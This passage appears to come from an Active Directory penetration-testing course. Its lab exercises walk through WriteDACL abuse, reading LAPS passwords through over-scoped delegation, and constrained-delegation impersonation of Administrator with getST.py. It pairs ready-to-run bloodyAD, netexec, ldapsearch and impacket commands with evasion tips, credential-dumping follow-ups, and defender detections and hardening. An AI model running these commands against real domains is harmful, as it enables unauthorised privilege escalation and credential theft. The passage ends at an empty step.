docs.text:
WriteDACL is the most insidious AD finding because the ACE itself is the persistence. Cleanup discipline is the difference between an audit finding and an actual compromise.

WriteDACL hardening

  • Build DACL baselines for every Tier-0 group and user in a Tier-0 OU; diff weekly.
  • Restrict WriteDACL and WriteOwner to the smallest possible set of trusted principals.
  • Audit and remove orphaned ACEs from prior projects (see Q3 dsacls.exe workflow).
  • Build a SIEM detection on group-membership change events (4728/4732/4756) with allow-list of legitimate enrollers.
  • Forward DACL changes (event 5136) on Tier-0 objects to the SIEM with retention long enough to detect slow-burn persistence (90+ days).

docs.title: Record Your Findings
docs.text:
WriteDACL edge confirmed:

IT_HelpDesk --WriteDACL--> Backup_Operators_<token>

ACE added:

j.chen GENERIC_ALL on Backup_Operators_<token>

Flag:

(OCR{wd_...})

Cleanup performed: yes / no

docs.title: Analysis Questions
docs.text:
1. Microsoft logs DACL changes as event 4670. From a SOC perspective, why is monitoring 4670 cleanly so hard, and what makes WriteDACL exploitation often invisible?

Reveal Answer

Event 4670 fires whenever any object's DACL changes. AD writes thousands of these per day in normal operation: GPO updates, OU delegations adjusted by automation, scripts that adjust permissions during user provisioning, third-party tools rewriting ACLs after schema extensions. The signal-to-noise ratio is brutal. Most SOCs either turn 4670 logging off or filter it so heavily that only object-class changes (computer/user added or deleted) survive. WriteDACL exploitation produces a single 4670 against the target object with the new ACE in the SDDL string field; without parsing the SDDL and diffing against a known-good baseline, the SOC cannot tell that the new ACE grants attacker-controlled escalation. Defenders who do this well use change-monitoring products that diff DACLs against baselines and alert on new ACEs granting GenericAll, WriteDACL, WriteOwner, or GenericWrite to non-privileged principals.

2. The exercise tells you to clean up your ACE before submitting. In a real engagement, when do you NOT clean up, and why?

Reveal Answer

You do not clean up when (a) the engagement explicitly asks you to leave persistence so the defender can practice detection and response, (b) you are still mid-engagement and may need to re-exercise the path, or (c) the customer wants the exact attacker-state preserved for forensic investigation later. Outside those cases, always clean up: every artifact you leave behind is something the customer has to chase down during their post-engagement validation, and a sloppy red team that leaves dozens of GenericAll ACEs across the directory looks unprofessional. Modern engagement reports include a "cleanup performed" section that lists exactly which artifacts were created and which were removed. The discipline is also useful in real attacks: a long-term operator who leaves new ACEs scattered in the directory increases their detectable surface every day.

3. The attack chain is WriteDACL -> add GenericAll ACE -> add member -> profit. Why might a more careful operator add a more specific ACE than GenericAll?

Reveal Answer

More specific ACEs (e.g., WriteProperty on the member attribute only) are quieter in three senses: (a) some SIEM rules trigger on GenericAll granted to non-Tier-0 principals but ignore property-specific writes; (b) attribute-specific ACEs read more like a normal delegated permission ("the helpdesk can manage group memberships") than a clear escalation; (c) audit reports that highlight the worst-rights-granted often miss attribute-specific ACEs because their audit logic focuses on FullControl. The trade-off is that property-specific ACEs require knowing the right attribute GUID. For groups that is member (bf9679c0-0de6-11d0-a285-00aa003049e2). For full operational discipline, learn the GUIDs for the common attributes you write often: member for groups, pwdLastSet and userAccountControl for users, msDS-AllowedToActOnBehalfOfOtherIdentity for computers (RBCD).

docs.title: Key Takeaways
docs.text:
• WriteDACL lets you add an ACE granting any further right; GenericAll on a group is the standard pick.
  • Group membership changes are immediate locally but require a new TGT to land in your PAC.
  • Cleanup is a habit: remove your ACE and your group membership at the end.
  • Event 4670 logs the change but signal-to-noise is poor; defenders need DACL baselines.
  • Property-specific ACEs are quieter than GenericAll; learn the common attribute GUIDs.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover WriteDACL exploitation and clean cleanup. Run them in this order; reverse the cleanup order is critical.

Goal Command Add GenericAll ACE to group bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> add genericAll "<group>" <atk> Add yourself to the group net rpc group addmem "<group>" "<atk>" -U "<DOMAIN>\<atk>%<pw>" -S <dc> Refresh PAC kdestroy; echo '<pw>' \| kinit <atk>@<REALM> Cleanup (in this order) net rpc group delmem "<group>" "<atk>" ...; bloodyAD ... remove genericAll "<group>" <atk>

docs.title: Spaced Repetition
docs.text:
Card 1: bloodyAD GenericAll ACE Add

Q: Write the bloodyAD command to add a GenericAll ACE for j.smith on group Targets in corp.local, authenticating as j.smith / Pass#.

Answer 
bloodyAD -d corp.local -u j.smith -p 'Pass#' --host dc01 \
  add genericAll "Targets" j.smith

Reverse with remove genericAll "Targets" j.smith. The verb add/remove toggles ACE presence; targets are object names; principal is the user being granted.

Card 2: net rpc Group Membership

Q: Add and then remove user j.smith from group Targets using j.smith / Pass# against DC dc01.

Answer 
net rpc group addmem "Targets" "j.smith" -U "DOM\j.smith%Pass#" -S dc01
net rpc group delmem "Targets" "j.smith" -U "DOM\j.smith%Pass#" -S dc01

The user authenticating must have permission on the group (typically GenericAll, GenericWrite, or AddMember on the member attribute).

Card 3: PAC Refresh

Q: You added yourself to a group. Why might you still not see the new permission until you re-authenticate?

Answer

Group memberships are baked into the PAC inside your TGT at the time the TGT was issued. Subsequent TGS-REPs derived from that TGT inherit the same PAC. Your new membership only appears in tickets issued after a fresh AS exchange. To force the refresh: kdestroy then kinit user@REALM. SMB clients usually re-authenticate transparently on the next connection, but if you have a long-lived ticket cache (browser SSO, mounted shares), the new permission may not appear until you log out and back in.

Card 4: Specific Attribute GUIDs

Q: Name the attribute GUID for the member attribute on a group object.

Answer

bf9679c0-0de6-11d0-a285-00aa003049e2. Used in attribute-specific ACEs. Other common ones to memorize: f3a64788-5306-11d1-a9c5-0000f80367c1 (servicePrincipalName), bf967a0a-0de6-11d0-a285-00aa003049e2 (pwdLastSet), 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 (msDS-AllowedToActOnBehalfOfOtherIdentity, the RBCD attribute).

Card 5: Cleanup Order

Q: You exercised WriteDACL: added a GenericAll ACE, joined the group. List the cleanup steps in correct order.

Answer
  1. Remove yourself from the group: net rpc group delmem "Group" "you". 2. Remove the ACE you added: bloodyAD remove genericAll "Group" you. Order matters: removing the ACE first kills your right to remove yourself from the group, leaving you stuck. If you forget step 1 and remove the ACE first, you can recover by re-exercising your WriteDACL right (if it still exists) or by getting a Domain Admin to clean up.

docs.title: Before You Begin
docs.text:
LAPS (Local Administrator Password Solution) is Microsoft's mitigation for local admin password reuse across an estate. Each domain-joined machine gets a randomized local admin password, rotated on a schedule, stored on the machine's AD computer object in the ms-Mcs-AdmPwd attribute (legacy LAPS) or msLAPS-Password (Windows LAPS). The whole approach depends on read delegations being scoped tightly: only specific helpdesk groups should be able to read the LAPS attribute on specific OUs. When the delegation is too wide, any member of that group becomes effective local admin on every covered machine.

Exercise 4.3 puts you on the wrong side of an over-scoped delegation. WS_Admins_<token> can read ms-Mcs-AdmPwd on WS-ENG-<token>. j.chen is a member via IT_HelpDesk nesting. Read the password.

Tools required: netexec, pyLAPS, ldapsearch, bloodhound-python. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "LAPS is the right answer to local admin password reuse. Read access to the LAPS attribute is the wrong answer to delegation."

The LAPS-stored password for WS-ENG-<token> contains your flag literally; you do not need to authenticate to the workstation, you need to read the attribute and submit the value.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Identify the LAPS-protected attribute (ms-Mcs-AdmPwd or msLAPS-Password)
  • Confirm that j.chen (via inherited group) can read the attribute on WS-ENG-<token>
  • Read the value
  • Submit it as the flag

docs.title: LAPS Architecture at a Glance
docs.text:
LAPS is a small ecosystem: a CSE on each managed host writes the password into AD; reads are gated by delegations on the computer object. The diagram below maps the pieces together.

flowchart LR
    GPO["GPO settings:<br/>policy + interval"]
    CSE["LAPS CSE<br/>(on every workstation)"]
    AD["AD computer object<br/>ms-Mcs-AdmPwd<br/>(or msLAPS-Password)"]
    HD["Helpdesk delegate group<br/>(read on attribute)"]
    Atk["Attacker (j.chen)<br/>via nested group"]

    GPO --> CSE
    CSE -- "rotate + write" --> AD
    HD -- "read" --> AD
    Atk -- "transitive memberOf" --> HD

docs.title: Legacy vs Windows LAPS
docs.text:
The two flavors look similar in the directory but differ on the trust boundary that protects the secret. The table below summarises which attack works against which.

Property Legacy LAPS Windows LAPS Schema ms-Mcs-AdmPwd msLAPS-Password (plain) or msLAPS-EncryptedPassword (DPAPI-NG) Storage Plaintext, ACL-gated Plaintext OR DPAPI-NG ciphertext to a named principal Read attack LDAP read with delegated group LDAP read PLUS DPAPI-NG decrypt as principal Defender's lever Tighten ACL Tighten ACL + scope decryption principal netexec --laps outcome Plaintext if you have read Plaintext if you can decrypt; ciphertext otherwise

docs.title: Background: Two Kinds of LAPS
docs.text:
Variant Schema attribute Encryption at rest Read API Legacy LAPS (AdmPwd.PS) ms-Mcs-AdmPwd Plaintext (relies on AD ACLs) LDAP read Windows LAPS (Server 2019+) msLAPS-Password, msLAPS-EncryptedPassword Optional DPAPI-NG encryption to a designated principal LDAP read + decrypt

Legacy LAPS is more common in environments older than ~2022. Windows LAPS is the modern default. The attack model is the same: find who can read the attribute and abuse the over-scoped delegation. The difference: Windows LAPS with encryption requires you to also be the encryption principal (or someone authorized to decrypt for them) to recover the plaintext.

docs.title: Why over-scoped delegations happen
docs.text:
Helpdesk teams need to recover local admin passwords for break-fix work. The administrator delegating the read permission has two choices:

  1. Per-OU scoped: grant Engineering_Helpdesk read on ms-Mcs-AdmPwd for the Engineering OU only. Repeat per OU. Tedious but correct.
  2. Domain-wide: grant IT_HelpDesk read on ms-Mcs-AdmPwd for the whole domain. One click. Wrong.

Option 2 is the path of least resistance and exists in many production environments. The result: any compromise of any IT_HelpDesk member yields local admin on every domain-joined machine.

docs.title: The defender's audit query
docs.text:
# Find every principal that can read ms-Mcs-AdmPwd somewhere
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=corp,DC=nordport,DC=local"

The output should show only the per-OU helpdesk groups. If you see Domain Users or any unexpected principal, the delegation is wrong.

docs.title: netexec --laps
docs.text:
netexec ldap corp-dc01 -u j.chen -p 'Welcome2026#' -d corp.nordport.local --laps

Outputs every machine the caller can read LAPS for, with the plaintext password (and decrypts Windows LAPS if the attacker is authorized).

docs.title: Direct LDAP
docs.text:
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=WS-ENG-<TOKEN>)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

If you can read the attribute, the value comes back; if not, the attribute is omitted from the response.

docs.title: pyLAPS
docs.text:
pyLAPS --action get -d corp.nordport.local -u j.chen -p 'Welcome2026#' --dc-ip <dc>

A purpose-built tool that handles both legacy and Windows LAPS, including DPAPI-NG decryption when you have the right keys.

docs.title: Step 1: Confirm Membership Path
docs.text:
Group nesting is the trap LAPS delegations fall into. j.chen is a direct member of IT_HelpDesk, which is itself nested into WS_Admins_<token>. The standard memberof= filter does not follow nesting; you need the LDAP chain matching extended OID 1.2.840.113556.1.4.1941 to return transitive memberships.

Kali - Verify j.chen reaches WS_Admins_ 

ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(memberof:1.2.840.113556.1.4.1941:=CN=WS_Admins_${OCR_SCOPE_TOKEN},OU=IT,DC=corp,DC=nordport,DC=local)(sAMAccountName=j.chen))" \
  sAMAccountName
Token Effect memberof:1.2.840.113556.1.4.1941:= LDAP_MATCHING_RULE_IN_CHAIN; matches transitive group membership. CN=WS_Admins_<token>,OU=IT,DC=... Full distinguished name of the target group. (sAMAccountName=j.chen) And-clause to verify j.chen specifically.

If j.chen's name appears in the output, the transitive path is alive. Empty output means a nesting break (common after group reorgs); without the path, Step 2 returns no LAPS hits.

docs.title: Step 2: Read LAPS via netexec
docs.text:
netexec ldap --laps walks every computer object the caller can see, attempts to read the LAPS attribute on each, and prints whichever are readable. It tries both legacy (ms-Mcs-AdmPwd) and Windows LAPS (msLAPS-Password, msLAPS-EncryptedPassword) and decrypts the latter when the caller is authorized.

Kali - Pull every readable LAPS password

netexec ldap corp-dc01 -u j.chen -p 'Welcome2026#' \
  -d corp.nordport.local --laps
Token Effect ldap LDAP protocol module (vs smb, winrm, etc.). --laps Enable the LAPS-reader sub-feature.

Output format: one line per readable computer with the plaintext after LAPS Password:. Look for WS-ENG-<token> (the token is uppercased in the computer name; netexec prints it as stored). Other students' machines that you can also see (because IT_HelpDesk is over-scoped on the lab too) appear in the same listing.

docs.title: Step 3: Read LAPS via Direct LDAP
docs.text:
For surgical extraction (one machine, one attribute) and to demonstrate the underlying primitive without netexec's wrapper, use ldapsearch directly. The tr command upper-cases the token because computer object names use upper-case in this lab.

Kali - LDAP read of ms-Mcs-AdmPwd on your computer

TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=WS-ENG-${TOK})" ms-Mcs-AdmPwd
Token Effect tr 'a-z' 'A-Z' Translate lower to upper case (token may be lowercase in env var). (name=WS-ENG-XXXX) Filter by computer name attribute. ms-Mcs-AdmPwd Trailing attribute; only this attribute returned.

The ms-Mcs-AdmPwd value is the flag. If the attribute does not appear in the response (no error, just absent), the read permission is denied; recheck Step 1.

docs.title: Step 4: Submit
docs.text:
The plaintext IS the flag. Submit on the platform.

Common gotchas

  • Wrong token case: lab computer names are WS-ENG-J001 (uppercase) but OCR_SCOPE_TOKEN is j001 (lowercase). Always upper-case the token for computer-object lookups.
  • Windows LAPS instead of legacy: if the lab were Windows LAPS, ms-Mcs-AdmPwd would be empty and msLAPS-Password would hold the plaintext (or msLAPS-EncryptedPassword if encrypted). Re-query with the right attribute.
  • No transitive path: AD groups are not always transitive. Domain Local groups with Global group members work; some cross-forest scenarios do not. Step 1's chain-match query is the diagnostic.
  • netexec verbose mode: add -v if --laps returns no hits to see whether netexec saw the computer at all (scope filter problem) or saw it and could not read (ACL problem).

docs.title: Blue Team Perspective
docs.text:
Reads of the LAPS attribute generate event 4662 with a specific access mask only when the relevant SACL is configured. Most environments are missing this, which is exactly why the attack persists.

Activity Event ID Where it fires LAPS attribute read 4662 (with SACL) DC Security log Bulk LAPS enumeration 4662 burst DC Security log Workstation local-admin login 4624 logon type 3 / 10 Workstation Security log Defender for Identity "Suspicious LDAP query (LAPS)" MDI

What real defenders look for

Set a SACL on the ms-Mcs-AdmPwd (or msLAPS-Password) attribute auditing successful reads by non-Tier-0 principals. Forward the resulting 4662 events to the SIEM. Alert on any read by a principal not on the helpdesk allow-list. The detection has very low cardinality and high signal.

docs.title: Hardening Note
docs.text:
LAPS is the right control; ACL hygiene around it is what makes or breaks the deployment. The list below is the practical menu.

LAPS hardening

  • Migrate to Windows LAPS with DPAPI-NG encryption tied to a tightly scoped principal.
  • Scope read delegations per OU using Set-AdmPwdReadPasswordPermission. Never delegate at the domain root.
  • Run Find-AdmPwdExtendedRights quarterly against each managed OU; alert on changes.
  • Add a SACL auditing reads of the LAPS attribute and forward 4662 events with allow-list of legitimate readers.
  • Disable legacy LAPS attributes once Windows LAPS is fully deployed; confirm ms-Mcs-AdmPwd is empty everywhere.
  • Build a SIEM detection on netexec ldap --laps-shaped traffic: many distinct computer-attribute reads from one source in seconds.

docs.title: Record Your Findings
docs.text:
Target computer:

WS-ENG-<TOKEN>

Reading group:

WS_Admins_<token>

j.chen's path to the group:

j.chen --MemberOf--> IT_HelpDesk --MemberOf--> WS_Admins_<token>

Recovered LAPS plaintext (= flag):

(OCR{laps_...})

docs.title: Analysis Questions
docs.text:
1. Legacy LAPS stores the password in plaintext under ms-Mcs-AdmPwd. Why does that work, and what is Microsoft's improvement in Windows LAPS?

Reveal Answer

Legacy LAPS works because the attribute's read permission is restricted by AD ACLs to the delegated helpdesk groups. The plaintext is "encrypted" by access control rather than cryptographic encryption: only authorized principals can read it. The improvement in Windows LAPS is the introduction of DPAPI-NG-based encryption tied to a specific principal (a user, group, or computer), so even an attacker who reads the attribute as Domain Admin cannot recover the plaintext without being able to decrypt via the principal's key. The encryption narrows the trust boundary from "anyone with read on the attribute" to "the specific principal authorized to decrypt." Operationally, Windows LAPS encryption also makes it possible to grant read across a wider scope (for inventory tooling) while keeping plaintext recovery scoped tighter.

2. The defender control is to scope the read delegation tightly per OU. What stops a defender from doing this in practice?

Reveal Answer

The barriers are organizational, not technical: (a) helpdesk teams want one-click access to any machine across the estate so per-OU delegation feels obstructive; (b) executive turnover reorganizes OUs faster than delegations get re-evaluated, so old wide delegations accumulate; (c) AD ACL audits are tedious manual work; few teams do them quarterly; (d) Microsoft's installation tooling defaults to wide ("apply to OU=Computers") rather than narrow. The fix is automation: scripts that periodically audit Find-AdmPwdExtendedRights against a baseline and alert on changes, plus a service-catalog-style helpdesk request flow where the operator clicks a button per host that grants ephemeral access for a short window.

3. Once you read the LAPS password, you are local admin on the workstation. What does that get you that the AD compromise alone does not?

Reveal Answer

Local admin on a domain-joined workstation gets you: (a) every credential cached on the machine via LSASS / DPAPI dumping (mimikatz sekurlsa::logonpasswords, lsassy, pypykatz), (b) every browser session cookie (DPAPI-protected, but trivially decrypted as the user), (c) every saved Wi-Fi key, every saved RDP credential, every personal certificate enrolled to the user, (d) every running process's memory, including in-memory credentials for SaaS tools, and (e) the ability to install a persistence mechanism. If the workstation belongs to a higher-privileged user (an admin doing helpdesk work, or a developer with cloud credentials), the lateral pivot to higher AD privilege via that user's stored secrets is often immediate.

docs.title: Key Takeaways
docs.text:
• LAPS attribute is ms-Mcs-AdmPwd (legacy) or msLAPS-Password (Windows LAPS).
  • Read delegations are AD ACLs; widely-scoped delegations leak local admin on every covered machine.
  • netexec ldap --laps enumerates every readable LAPS password in one call.
  • Windows LAPS adds DPAPI-NG encryption tied to specific decryption principals.
  • Defender control: per-OU scoped delegations, periodic ACL audits, service-catalog-style ephemeral access.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover discovery and abuse for both LAPS variants. Run them in this order on any engagement.

Goal Command Bulk LAPS enumeration netexec ldap <dc> -u <user> -p '<pw>' -d <domain> --laps Targeted LDAP read (legacy) ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<user>" -w '<pw>' -b "<DN>" "(name=<HOST>)" ms-Mcs-AdmPwd Targeted LDAP read (Windows LAPS) ldapsearch ... "(name=<HOST>)" msLAPS-Password msLAPS-EncryptedPassword pyLAPS (handles DPAPI-NG decrypt) pyLAPS --action get -d <domain> -u <user> -p '<pw>' --dc-ip <dc>

docs.title: Spaced Repetition
docs.text:
Card 1: LAPS Attribute Names

Q: What attributes hold the LAPS password in legacy LAPS vs Windows LAPS?

Answer

Legacy LAPS: ms-Mcs-AdmPwd (plaintext, ACL-protected). Windows LAPS: msLAPS-Password (plaintext when not encrypted) and msLAPS-EncryptedPassword (DPAPI-NG encrypted blob, requires the authorized decryption principal). The expiration time is ms-Mcs-AdmPwdExpirationTime for legacy, msLAPS-PasswordExpirationTime for Windows LAPS.

Card 2: netexec --laps Discovery

Q: One command to enumerate every LAPS password readable by j.smith / Pass# on corp.local against DC dc01.

Answer 
netexec ldap dc01 -u j.smith -p 'Pass#' -d corp.local --laps

Outputs computer name and plaintext for each readable entry. Add --users <user> to query for a specific computer rather than enumerating all.

Card 3: Direct LDAP Read of ms-Mcs-AdmPwd

Q: Write the ldapsearch query to read ms-Mcs-AdmPwd from computer WS-ENG-A7F3 in corp.local.

Answer 
ldapsearch -x -LLL -H ldap://dc01 \
  -D "CORP\j.smith" -w 'Pass#' \
  -b "DC=corp,DC=local" \
  "(name=WS-ENG-A7F3)" ms-Mcs-AdmPwd

If you cannot read the attribute, the response omits it (no error). If you can, the value appears as a string.

Card 4: Find-AdmPwdExtendedRights

Q: How does a defender enumerate every principal with LAPS read on a given OU?

Answer 
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=corp,DC=local"

From the AdmPwd.PS module. Output should show only the intended helpdesk groups. Any unexpected principal (especially Domain Users, Authenticated Users, or unfamiliar admin groups) is a finding. Run quarterly; baseline the output and alert on changes.

Card 5: DPAPI-NG and Windows LAPS

Q: Windows LAPS encryption changes the trust boundary from "anyone with attribute read" to what?

Answer

"The specific principal authorized to decrypt." DPAPI-NG (Data Protection API: Next Generation) encrypts the password to a named principal (user, group, or computer SID); only that principal can decrypt with their key. An attacker with attribute read but without the principal's keys gets ciphertext, not plaintext. The encryption lets an organization grant attribute-read more widely (for inventory tools or backup) while keeping plaintext recovery tightly scoped. Defender check: ensure msLAPS-EncryptedPassword is the populated attribute, not msLAPS-Password.

docs.title: Before You Begin
docs.text:
Constrained delegation is a Kerberos feature that lets an account impersonate any user when authenticating to a specifically allowed list of services. The original use case was a web app that authenticates to a database on behalf of the connected user without the user re-authenticating. The abuse case: if you compromise an account that is configured for constrained delegation to a powerful service (CIFS on a DC, HTTP on AD CS, MSSQL on a sensitive database), you can use S4U2self followed by S4U2proxy to impersonate any user (including Domain Admins) when authenticating to that service.

Exercise 4.4 gives you the credential of svc_deleg_<token>, an account with msDS-AllowedToDelegateTo containing cifs/corp-dc01. Impersonate Administrator, mount the DC's C$ as Administrator, and read your per-token flag file.

Tools required: impacket-getST (often getST.py), smbclient, klist, ldapsearch. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "Constrained delegation says 'this account may impersonate any user, but only to these specific services.' If one of those services is the DC's CIFS share, you have a path to anything that account is allowed to delegate."

Per-student: svc_deleg_<token> has a seeded credential (visible in the lab dashboard or recoverable from earlier exercises). Use it to impersonate Administrator and read C:\flag_<token>.txt.

Credentials:

Username Password Source svc_deleg_<token> (per-token, see lab dashboard) Provided / earlier exercise

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Identify accounts with msDS-AllowedToDelegateTo set
  • Confirm svc_deleg_<token> delegates to cifs/corp-dc01
  • Use getST.py -impersonate Administrator to obtain a TGS for cifs/corp-dc01 as Administrator
  • Use the ticket to read \\corp-dc01\C$\flag_<token>.txt

docs.title: S4U2self + S4U2proxy In One Picture
docs.text:
The two extension messages are the entire attack. The diagram below shows what each does and why the combination yields impersonation.

sequenceDiagram
    autonumber
    participant A as Attacker (svc_deleg)
    participant K as KDC
    participant T as Target (cifs/corp-dc01)

    A->>K: AS-REQ for svc_deleg
    K-->>A: TGT_svc_deleg

    Note over A,K: S4U2self -- "give me a TGS to MYSELF as Administrator"
    A->>K: TGS-REQ (sname=svc_deleg, S4U2self for Administrator)<br/>TGT_svc_deleg in padata
    K-->>A: TGS_admin_to_svc_deleg<br/>(forwardable, signs PAC for Administrator)

    Note over A,K: S4U2proxy -- "use that TGS to get a ticket to cifs/corp-dc01"
    A->>K: TGS-REQ (sname=cifs/corp-dc01)<br/>TGS_admin_to_svc_deleg in padata
    K-->>A: TGS_admin_to_cifs<br/>(only because cifs/corp-dc01 is in msDS-AllowedToDelegateTo)

    A->>T: AP-REQ via SMB with TGS_admin_to_cifs
    T-->>A: SMB session as Administrator

docs.title: Three Delegation Types Compared
docs.text:
The four delegation flavors look similar at the protocol level but have very different attack footprints. The table below tells you what to look for in userAccountControl and which message to abuse.

Type UAC bit / attribute What you need What you abuse Unconstrained TRUSTED_FOR_DELEGATION (524288) A user authenticates to the host Captured forwardable TGT Constrained (no PT) msDS-AllowedToDelegateTo populated A target user TGT (forwardable) S4U2proxy only Constrained (with PT) msDS-AllowedToDelegateTo + T2A4D (16777216) Just the source credential S4U2self -> S4U2proxy (this exercise) RBCD msDS-AllowedToActOnBehalfOfOtherIdentity on target Compromised computer object Self-trust (covered in 4.5)

docs.title: Background: Three Kinds of Delegation
docs.text:
Kerberos in AD supports three delegation models. Knowing which is which is half of the attack:

Type AD attribute set What it allows Detection signal Unconstrained userAccountControl: TRUSTED_FOR_DELEGATION (524288) Account receives a forwardable TGT for any user who authenticates to it; can act as any of them anywhere Any account with this UAC bit; high signal Constrained (no protocol transition) msDS-AllowedToDelegateTo populated, no T2A4D Account uses S4U2proxy with an existing user TGT; cannot self-initiate Hard to abuse without an existing forwarded TGT Constrained (with protocol transition) msDS-AllowedToDelegateTo populated, userAccountControl: TRUSTED_TO_AUTH_FOR_DELEGATION (16777216) Account uses S4U2self to obtain a TGS for any user without their TGT, then S4U2proxy to the allowed service The classic abuse target Resource-Based (RBCD) msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer Reverses the trust direction: target says "I trust source to delegate" Covered in exercise 4.5

The "with protocol transition" variant is what this exercise targets. The flag combination msDS-AllowedToDelegateTo + T2A4D lets the holder unilaterally impersonate any user to the allowed services; no user TGT required.

docs.title: The S4U2self / S4U2proxy flow
docs.text:
svc_deleg          KDC                                       Target service (cifs/corp-dc01)
   |                |                                                       |
   |  1. Authenticate normally, get a TGT                                   |
   |--------------->|                                                       |
   |<---------------|                                                       |
   |                |                                                       |
   |  2. S4U2self: "I want a service ticket to MYSELF as Administrator"     |
   |     (uses T2A4D to bypass the requirement that Administrator presents  |
   |      a TGT)                                                            |
   |--------------->|                                                       |
   |<---------------|  TGS for svc_deleg-as-Administrator                   |
   |                |                                                       |
   |  3. S4U2proxy: "Using this TGS as Administrator, give me a TGS to      |
   |     cifs/corp-dc01"                                                    |
   |--------------->|                                                       |
   |<---------------|  TGS for cifs/corp-dc01-as-Administrator              |
   |                                                                        |
   |  4. Connect with the TGS                                               |
   |---------------------------------------------------------->             |

The KDC validates that the target service (cifs/corp-dc01) is in svc_deleg's msDS-AllowedToDelegateTo list. If yes, it issues. The target service receives a normal TGS for Administrator and serves the request as Administrator. From the service's perspective the call is from Administrator; there is no protocol-level signal that delegation occurred.

docs.title: Why CIFS on a DC is the worst-case target
docs.text:
Reading \\corp-dc01\C$ as Administrator gives you the entire NT directory of the DC. From there: - Pull ntds.dit (offline, copy + ESEDB extract) - Read the registry hives for SYSTEM, SAM, SECURITY (LSA secrets, machine account, cached credentials) - Pull the SAM hashes, krbtgt hash via secretsdump on the dumped files - Effectively own the domain

So msDS-AllowedToDelegateTo containing any DC service (especially cifs, host, ldap, rpcss) is a Tier-0 escalation path. Defenders should never delegate any service to any DC unless absolutely required.

docs.title: LDAP enumeration of constrained delegation
docs.text:
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo userAccountControl

Filter for accounts with T2A4D too:

(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))

16777216 is 0x1000000, the T2A4D bit.

docs.title: getST.py for S4U2self + S4U2proxy
docs.text:
getST.py corp.nordport.local/svc_deleg_<token>:'<password>' \
  -spn 'cifs/corp-dc01.corp.nordport.local' \
  -impersonate Administrator \
  -dc-ip <dc_ip>
Flag Effect realm/user:password source authentication -spn target service principal name -impersonate <user> the user to impersonate (S4U2self target) -dc-ip DC for the AS exchange

The output is a .ccache file named after the impersonated user.

docs.title: Using the resulting ticket
docs.text:
export KRB5CCNAME=Administrator.ccache
smbclient //corp-dc01.corp.nordport.local/C$ -k -c "ls"

-k tells smbclient to use the cached Kerberos ticket; the ccache contains the TGS for Administrator-to-cifs/corp-dc01.

docs.title: Step 1: Find Constrained-Delegation-with-T2A4D Accounts
docs.text:
The discovery query combines two filters: accounts that have ANY entry in msDS-AllowedToDelegateTo (i.e., are configured for some constrained delegation) AND accounts with the T2A4D bit set in userAccountControl. Either alone yields a noisier result; the AND zeros in on the directly abusable accounts.

Kali - Enumerate

ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  sAMAccountName msDS-AllowedToDelegateTo
Token Effect (msDS-AllowedToDelegateTo=*) Has any value (account configured for constrained delegation). userAccountControl:1.2.840.113556.1.4.803:=16777216 Bitwise AND against UAC for T2A4D (0x1000000). sAMAccountName msDS-AllowedToDelegateTo Return only these two attributes.

Confirm svc_deleg_<token> shows up with cifs/corp-dc01... in its allowed-to list. Other students' accounts also appear; that is expected.

docs.title: Step 2: Obtain the Source Credential
docs.text:
For the lab, the seeded password is in the lab dashboard or visible in the per-token flag JSON the orchestrator wrote. In a real engagement you would have recovered it via Kerberoast (Exercise 3.3), a leaked SYSVOL script (Exercise 2.2), or any other credential-recovery path.

SAM:  svc_deleg_<token>
Pwd:  (per-token, see dashboard)

docs.title: Step 3: Run S4U2self + S4U2proxy
docs.text:
getST.py performs both S4U exchanges in one call. Step 1 (S4U2self) requests a TGS from the KDC where svc_deleg impersonates Administrator to itself; T2A4D allows the request without Administrator presenting a TGT. Step 2 (S4U2proxy) uses that TGS as proof to request a TGS for the configured target service. The KDC validates the SPN against msDS-AllowedToDelegateTo and issues if it matches.

Kali - Get Administrator's TGS via getST.py

cd ~/work && mkdir -p adpt-4-04 && cd adpt-4-04
getST.py "corp.nordport.local/svc_deleg_${OCR_SCOPE_TOKEN}:<password>" \
  -spn 'cifs/corp-dc01.corp.nordport.local' \
  -impersonate Administrator \
  -dc-ip <dc_ip>
Flag Effect <realm>/<user>:<pw> Source authentication string. -spn '<svc>/<host>.<realm>' Target SPN; must match an entry in source's msDS-AllowedToDelegateTo. -impersonate <user> The user whose identity will appear on the resulting ticket. -dc-ip <ip> KDC IP (skip DNS).

A file named Administrator.ccache is written to the current directory. The script prints the impersonated principal and the TGS lifetime. If you see KDC_ERR_BADOPTION it usually means the SPN does not match the allowed-to list verbatim; check trailing instance/port and case.

docs.title: Step 4: Use the Ticket
docs.text:
